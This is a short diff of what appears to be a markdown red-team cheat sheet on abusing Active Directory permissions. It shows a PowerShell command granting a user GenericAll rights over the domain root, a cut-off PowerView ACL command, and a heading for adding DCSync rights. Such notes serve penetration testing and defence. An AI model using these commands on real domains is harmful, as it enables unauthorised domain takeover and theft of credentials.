@@ -18,7 +18,6 @@ Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=name' -PrincipalIdentity usern
 ```powershell title:"Add FullControl rights (ActiveDirectory Module and RACE)"
 Set-ADACL -SamAccountName username -DistinguishedName 'DC=domain,DC=name' -Right GenericAll -Verbose
 ```
-
 #### Add rights for DCSync
 
 ```powershell title:"Add rights for DCSync (PowerView)"
